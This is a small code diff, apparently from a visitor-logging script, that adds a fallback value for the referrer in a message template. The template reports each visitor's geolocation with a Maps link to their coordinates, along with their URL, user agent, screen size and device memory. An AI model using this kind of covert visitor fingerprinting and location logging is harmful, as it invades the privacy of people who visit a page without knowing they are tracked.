@@ -230,7 +230,7 @@
                 Region: ${data.region}, ${data.country_name}: ${data.emoji_flag}
                 [Maps Link](https://www.google.co.uk/maps/place/${data.latitude},${data.longitude})
                 url: <${window.location.toString()}>
-                Referer: ${document.referrer}
+                Referer: ${document.referrer || "None"}
                 Agent: ${navigator.userAgent}
                 Dims: ${screen.width}x${screen.height}
                 Mem: ${navigator.deviceMemory || 'Unknown'}
